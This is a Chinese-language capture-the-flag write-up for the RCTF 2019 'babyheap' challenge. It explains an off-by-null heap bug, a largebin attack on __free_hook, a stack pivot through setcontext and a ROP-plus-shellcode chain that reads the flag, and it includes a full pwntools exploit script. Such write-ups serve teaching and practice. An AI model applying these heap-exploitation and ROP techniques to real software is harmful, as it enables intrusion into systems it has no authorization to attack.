# rctf-2019-babyheap

https://www.freebuf.com/articles/system/209096.html

## 2019 RCTF babyheap

### 漏洞类型

off by one

### 背景知识

largebin attack
unlink
chunk overlapping
ROPshellcode编写

### 保护机制

```
[*] '/home/leo/Desktop/RCTF/babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开

### 程序逻辑
1、init

```c
fd = open("/dev/urandom", 0);
if ( fd < 0 ) {
    puts("open failed!");
    exit(-1);
}
read(fd, &ptrs, 8uLL);
close(fd);
ptrs = (void *)((unsigned int)ptrs & 0xFFFFF000);
mallopt(1, 0);
if ( mmap(ptrs, 0x1000uLL, 3, 34, -1, 0LL) != ptrs ) {
    puts("mmap error!");
    exit(-1);
}
signal(14, timeout_handler);
alarm(0x3Cu);
if ( prctl(38, 1LL, 0LL, 0LL, 0LL) ) {
    puts("Could not start seccomp:");
    exit(-1);
}
if ( prctl(22, 2LL, &filterprog) == -1 ) {
    puts("Could not start seccomp:");
    exit(-1);
}
```

首先选取2字节的随机数作为mmap函数分配给ptrs的地址，然后禁用了fastbin，最后对一些系统调用函数进行限制。利用seccomp-tools工具可以快速查看程序对哪些函数进行限制。

```
line  CODE  JT  JF  K
====  ====  ==  ==  ==========
0000: 0x20  0x00 0x00 0x00000004        A = arch
0001: 0x15  0x00 0x13 0xc000003e        if (A == ARCH_X86_64) goto 0003 else KILL
0002: 0x06  0x00 0x00 0x00000000        return KILL
0003: 0x15  0x00 0x11 0x00000029        if (A != socket) goto 0006
0004: 0x06  0x00 0x00 0x00000000        return KILL
0005: 0x15  0x00 0x0f 0x0000003b        if (A != execve) goto 0008
0006: 0x06  0x00 0x00 0x00000000        return KILL
0007: 0x15  0x00 0x0d 0x00000039        if (A != fork) goto 0010
0008: 0x06  0x00 0x00 0x00000000        return KILL
0009: 0x15  0x00 0x0b 0x0000009c        if (A != prctl) goto 0012
0010: 0x06  0x00 0x00 0x00000000        return KILL
0011: 0x15  0x00 0x09 0x0000003a        if (A != vfork) goto 0014
0012: 0x06  0x00 0x00 0x00000000        return KILL
0013: 0x15  0x00 0x07 0x00000065        if (A != ptrace) goto 0016
0014: 0x06  0x00 0x00 0x00000000        return KILL
0015: 0x15  0x00 0x05 0x0000003e        if (A != kill) goto 0018
0016: 0x06  0x00 0x00 0x00000000        return KILL
0017: 0x15  0x00 0x03 0x00000038        if (A != clone) goto 0020
0018: 0x06  0x00 0x00 0x00000000        return KILL
0020: 0x06  0x00 0x00 0x7ffff000        return ALLOW
```

2、add

```c
// add
while ( *((_QWORD *)ptrs + 2 * (signed int)index) && (signed int)index <= 15 ) {
    LODWORD(index) = index + 1;
    if ( (_DWORD)index == 16 ) {
        puts("You can't");
        exit(-1);
    }
}
printf("Size: ", index);
size = get_int();
if ( size <= 0 || size > 4096 ) {
    puts("Invalid size :(");
} else {
    *(_DWORD *)((char *)ptrs + 16 * index + 8) = size;    // save size
    *(_QWORD *)((char *)ptrs + 16 * index) = (unsigned __int64)calloc(size, 1uLL);
    puts("Add success :)");
}
```

3、edit

```c
// edit (off-by-null)
printf("Index:");
index = get_int();
if ( (signed int)index >= 0 && (signed int)index <= 15 && *((_QWORD *)ptrs + 2 * index) ) {
    printf("Content: ", index);
    v1 = readn(*((_QWORD *)ptrs + 2 * index), *((unsigned int *)ptrs + 4 * index + 2));
    *(_BYTE *)(*((_QWORD *)ptrs + 2 * index) + v1) = 0;   // off-by-null
    puts("edit success :)");
}
```

4、delete

```c
// delete
printf("Index:");
index = get_int();
if ( index >= 0 && index <= 15 && *((_QWORD *)ptrs + 2 * index) ) {
    free(*((void **)ptrs + 2 * index));
    *((_QWORD *)ptrs + 2 * index) = 0LL;
    *((_DWORD *)ptrs + 4 * index + 2) = 0;
    puts("Delete success :)");
}
```

5、show

```c
// show
printf("Index:");
index = get_int();
if ( index >= 0 && index <= 15 && *((_QWORD *)ptrs + 2 * index) )
    puts(*((const char **)ptrs + 2 * index));
```

### 利用思路

1. 利用off by null漏洞改写size，通过unlink形成chunk overlapping对fwd的堆块的bk和bk_nextsize实施控制。在这过程中顺便用show函数泄露libc和heap地址。
2. 由于涉及到fwd和victim两个large size的chunk的操作，需要先将一个chunk放入largebin，另一个放入unsortedbin，然后利用largebin attack往free_hook前某个内存错位写入0x56作为fake_chunk的size。然后分配到fake_chunk改写free_hook指针。
3. 因为程序开启的保护限制了system函数的使用，所以不能直接getshell。如果要利用open、read、write来读取flag文件，需要用到ROP技术。
4. 因为只知道libc和heap地址，不知道栈地址和程序基址，首先需要将rsp迁移到堆上。
5. 最后就能通过ROP来获取flag

### 具体实现

第一步：chunk overlapping
```python
add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6
edit(1,'a'*0x4f0+p64(0x500))#prev_size
edit(4,'a'*0x4f0+p64(0x500))#prev_size
#gdb.attach(p)
#第一个大chunk
dele(1)
edit(0,'a'*0x18)#off by null

add(0x18)#1
add(0x4d8)#7 0x050
dele(1)
dele(2)#overlap
#第二个大chunk
dele(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
add(0x4d8)#8 0x5a0
dele(4)
dele(5)#overlap
add(0x40)#4 0x580
```
这一步与Storm_note前一部分是一样的，这里不多做解释。

第二步：泄露libc和heap

在形成第一个大chunk的overlapping的时候因为chunk在unsortedbin里，可以顺便泄露libc基址和heap地址。这些是常规操作。

```
pwndbg> x/20gx 0x8c7d0000
0x8c7d0000: 0x0000563077524010  0x0000000000000018  0x0000000000000000  0x0000000000000000
0x8c7d0020: 0x0000563077524020  0x0000000000000511  0x0000000000000000  0x0000000000000000
...
0x8c7d0050: 0x0000563077524050  0x0000000000000000  0x0000000000000000  0x0000000000000000

pwndbg> x/10gx 0x563077524020
0x563077524020: 0x00007fb7fab21b78  0x00007fb7fab21b78  0x0000000000000000  0x0000000000000000
0x563077524040: 0x1616161616161616  0x0000000000000000  0x0000000000000000  0x0000000000000000

pwndbg> unsortedbin
unsortedbin
all: 0x563077524020 -> 0x7fb7fab21b78 (main_arena+88) <-> 0x563077524020
```

此时能控制的堆块从0x...50开始，unsortedbin中的堆块为0x...20，因此需要分配0x20大小的块出来，使得unsortedbin的地址写入0x...50。
```python
#recover leak libc
add(0x18)#1
show(7)
p.recv(1)
leak = p.recv(6)
libc_base=uu64(leak)-0x3c4b78
success('libc_base= {}'.format(hex(libc_base)))
```

```
pwndbg> x/20gx 0x564700040030
0x564700040030: 0x0000000000000000  0x0000000000000000  0x0000000000000000  0x00000000000004d8
0x564700040040: 0x00007fa1b47afb78  0x00007fa1b47afb78  0x0000000000000000  0x0000000000000000
```

用同样的方法，要泄露heap地址，需要在fd上保存下一个堆块指针，则需要将两个chunk放入unsortedbin中，同时第二个放入的chunk是可控的。

```python
#leak heap
add(0x4e0)#2
add(0x18)#8
dele(3)
dele(2)
show(7)
p.recv(1)
data = p.recv(6)
heap = uu64(data)-0x550
success('heap= {}'.format(hex(heap)))
add(0x4e0)
add(0x18)
```

第三步：largebin attack

```python
dele(2)    
add(0x4e8)
dele(2)
```

同样的由于在第一个chunk的大小为0x4e0，不满足(unsigned long) (size) > (unsigned long) (nb + MINSIZE)条件，因此将其剥离出来，放入largebin。然后继续往前搜索发现0x4f0满足要求，返回给用户。最后再把chunk2重新放入unsortedbin中。形成一个unsortedbin中的victim和largebin中的fwd。

```python
free_hook = libc.symbols['__free_hook']+libc_base
fake_chunk = free_hook-0x10

payload = p64(0) + p64(fake_chunk)      # bk
edit(7,payload)

payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(9,payload2)
add(0x40)
```
做了三件事情：

1. 将unsortedbin中的victim的bk改写为fake_chunk，使得下一次往前遍历时命中这块内存。
2. 改写largebin中的fwd的bk为victim，使得bck->fd=unsorted_chunks (av)成功执行。
3. 改写largebin中的fwd的bk_nextsize为fake_chunk的size字段，错位写入heap地址。

```
pwndbg> x/20gx 0xcbc0000
0xcbc0000: 0x00005635a3775010  0x0000000000000018  0x00005635a3775030  0x0000000000000018
0xcbc0020: 0x00007f1875ddf7a8  0x0000000000000040  0x00005635a3775560  0x0000000000000110
...

pwndbg> x/6gx &__free_hook
0x7f1875ddf7a8 <__free_hook>: 0x00007f1875dddb78  0x00005635a3775040
0x7f1875ddf7b0 <next_to_use.11231>: 0x0000000000000000  0x0000000000000000
0x7f1875ddf7c8 <disallow_malloc_check>: 0x0000000000000000  0x0000000000000000
```

第四步：迁移栈到堆，利用ROP

要用到ROP需要在栈上布置数据，但堆题一般都只是将数据放在堆上，因此很难利用ROP。解决方法是利用mov rsp,[xxx]的方法迁移栈到堆上。这里利用的是setcontext函数中有一段指令可以控制rsp寄存器。

```
0x00007f82f2e9db75 <+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
0x00007f82f2e9db7c <+60>:  mov    rbp,QWORD PTR [rdi+0x80]
0x00007f82f2e9db83 <+67>:  mov    r12,QWORD PTR [rdi+0x78]
0x00007f82f2e9db8a <+75>:  mov    r13,QWORD PTR [rdi+0x58]
0x00007f82f2e9db91 <+83>:  mov    r14,QWORD PTR [rdi+0x50]
0x00007f82f2e9db98 <+90>:  mov    r15,QWORD PTR [rdi+0x48]
0x00007f82f2e9db9f <+97>:  push   rcx
0x00007f82f2e9dba0 <+98>:  mov    rbx,QWORD PTR [rdi+0x70]
0x00007f82f2e9dba7 <+105>: mov    rdx,QWORD PTR [rdi+0x90]
0x00007f82f2e9dbae <+112>: mov    rcx,QWORD PTR [rdi+0x98]
0x00007f82f2e9dbb5 <+119>: mov    r8,QWORD PTR [rdi+0x28]
0x00007f82f2e9dbbc <+126>: mov    r9,QWORD PTR [rdi+0x30]
0x00007f82f2e9dbc3 <+133>: mov    rdi,QWORD PTR [rdi+0x68]
0x00007f82f2e9dbca <+140>: xor    eax,eax
0x00007f82f2e9dbcc <+142>: ret
```

因此，触发free_hook前，往free_hook中填写setcontext+53的地址，注意布置好第一个参数rdi对应的堆块的数据，就可以改写rsp等寄存器的值。

```python
setcontext = 0x47b75+libc_base
success('setcontext= {}'.format(hex(setcontext)))
edit(2,p64(setcontext))
接着是往一个堆上布置好ROP的数据，流程是调用mprotect将heap改为可执行，然后调用mmap分配一块可读可写可执行内存，接下来将shellcode复制到这块内存，最后跳到shellcode开始执行。

a = '''
mov esp,0x400100
push 0x67616c66
mov rdi,rsp
'''
shellcode = asm(a,arch='amd64',os='linux')    
shellcode += asm(shellcraft.amd64.syscall("SYS_open","rdi",'O_RDONLY', 0)+'mov rbx,rax',arch='amd64',os='linux')
shellcode += asm(shellcraft.amd64.syscall("SYS_read","rbx",0x400200,0x20),arch='amd64',os='linux')
shellcode += asm(shellcraft.amd64.syscall("SYS_write",1,0x400200,0x20),arch='amd64',os='linux')

p_rdi=0x0000000000021102+libc_base
p_rdx_rsi=0x00000000001150c9+libc_base
p_rcx_rbx=0x00000000000ea69a+libc_base
p_rsi = 0x00000000000202e8+libc_base
mprotect=libc.symbols['mprotect']+libc_base
setcontext = 0x47b75+libc_base
success('setcontext= {}'.format(hex(setcontext)))
mmap = libc.symbols['mmap']+libc_base
edit(2,p64(setcontext))

rop = p64(0)*5+p64(0xffffffff)+p64(0)#r8 r9
rop+= p64(0)*13
rop+= p64(heap+0x100)#mov rsp,[rdi+0xa0]
rop+= p64(p_rdi)#push rcx;ret
rop+= p64(heap)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(mprotect)
rop+= p64(p_rdi)+p64(0x400000)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(p_rcx_rbx)+p64(0x22)+p64(0)+p64(mmap)
rop+= p64(p_rcx_rbx)+p64(len(shellcode))+p64(0) + p64(p_rdi)+p64(0x400000) + p64(p_rsi)+p64(heap+0x1be)+p64(heap+0x1b0)
rop+= asm('''
rep movsd
push 0x400000
ret ''',arch='amd64',os='linux')+'\x00'
rop+= shellcode


edit(7,rop)
dele(7)
p.interactive()
```

其实这题更简单的方法是直接利用ROP来open、read、write或者直接在堆上执行shellcode。我这么做就是将两种方法结合起来。

### EXP
```python
from pwn import *
p = process('./babyheap')
libc = ELF('/home/leo/Desktop/libc-2.23.so')
#context.log_level='debug'

uu64    = lambda data               :u64(data.ljust(8, '\0'))
def add(size):
  p.recvuntil('Choice')
  p.sendline('1')
  p.recvuntil('Size:')
  p.sendline(str(size))

def edit(idx,mes):
  p.recvuntil('Choice')
  p.sendline('2')
  p.recvuntil('Index:')
  p.sendline(str(idx))
  p.recvuntil('Content:')
  p.send(mes)

def dele(idx):
  p.recvuntil('Choice')
  p.sendline('3')
  p.recvuntil('Index:')
  p.sendline(str(idx))
def show(idx):
  p.recvuntil('Choice')
  p.sendline('4')
  p.recvuntil('Index:')
  p.sendline(str(idx))

add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5
add(0x18)#6
edit(1,'a'*0x4f0+p64(0x500))#prev_size
edit(4,'a'*0x4f0+p64(0x500))#prev_size
#gdb.attach(p)
dele(1)
edit(0,'a'*0x18)#off by null

add(0x18)#1
add(0x4d8)#7 0x050
dele(1)
dele(2)#overlap

#recover leak libc
add(0x18)#1
show(7)
p.recv(1)
leak = p.recv(6)
libc_base=uu64(leak)-0x3c4b78
success('libc_base= {}'.format(hex(libc_base)))
#leak heap
add(0x4e0)#2
add(0x18)#8
dele(3)
dele(2)
show(7)
p.recv(1)
data = p.recv(6)
heap = uu64(data)-0x550
success('heap= {}'.format(hex(heap)))
add(0x4e0)
add(0x18)


##########################


dele(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
add(0x4d8)#8 0x5a0
dele(4)
dele(5)#overlap
add(0x40)#4 0x580

#9 control
dele(2)
add(0x4e8)
dele(2)
#gdb.attach(p)

free_hook = libc.symbols['__free_hook']+libc_base
fake_chunk = free_hook-0x10

payload = p64(0) + p64(fake_chunk)      # bk
edit(7,payload)


payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
payload2 += p64(0) + p64(fake_chunk+8)   
payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap

edit(9,payload2)
#gdb.attach(p)
add(0x40)#2

#rop
a = '''
mov esp,0x400100
push 0x67616c66
mov rdi,rsp
'''
shellcode = asm(a,arch='amd64',os='linux')    
shellcode += asm(shellcraft.amd64.syscall("SYS_open","rdi",'O_RDONLY', 0)+'mov rbx,rax',arch='amd64',os='linux')
shellcode += asm(shellcraft.amd64.syscall("SYS_read","rbx",0x400200,0x20),arch='amd64',os='linux')
shellcode += asm(shellcraft.amd64.syscall("SYS_write",1,0x400200,0x20),arch='amd64',os='linux')

p_rdi=0x0000000000021102+libc_base
p_rdx_rsi=0x00000000001150c9+libc_base
p_rcx_rbx=0x00000000000ea69a+libc_base
p_rsi = 0x00000000000202e8+libc_base
mprotect=libc.symbols['mprotect']+libc_base
setcontext = 0x47b75+libc_base
success('setcontext= {}'.format(hex(setcontext)))
mmap = libc.symbols['mmap']+libc_base
edit(2,p64(setcontext))

rop = p64(0)*5+p64(0xffffffff)+p64(0)#r8 r9
rop+= p64(0)*13
rop+= p64(heap+0x100)#mov rsp,[rdi+0xa0]
rop+= p64(p_rdi)#push rcx;ret
rop+= p64(heap)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(mprotect)
rop+= p64(p_rdi)+p64(0x400000)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(p_rcx_rbx)+p64(0x22)+p64(0)+p64(mmap)
rop+= p64(p_rcx_rbx)+p64(len(shellcode))+p64(0) + p64(p_rdi)+p64(0x400000) + p64(p_rsi)+p64(heap+0x1be)+p64(heap+0x1b0)
rop+= asm('''
rep movsd
push 0x400000
ret ''',arch='amd64',os='linux')+'\x00'
rop+= shellcode


edit(7,rop)
dele(7)
p.interactive()
```

## 总结
通过上述对两道题目的分析，我总结出largebin attack的一下利用条件或特点以及利用过程：
利用条件或特点： 
1. 需要对已经free的堆块进行控制。通常需要off by null或者UAF这类漏洞存在。 
2. fastbin不可用。通常会出现mallopt(1,0)禁用fastbin。 
3. 已知目标地址。通常可以泄露libc来控制free_hook

利用过程： 
1. 构造unsortedbin和largebin两个大堆块，并且能控制bk和bk_nextsize指针 
2. 将unsortedbin中的chunk的bk改为目标地址 
3. 将largebin中的chunk的bk改为目标地址+8使其可写 
4. 将largebin中的chunk的bk_nextsize改为目标地址-0x18-5错位写入size以便构造fake_chunk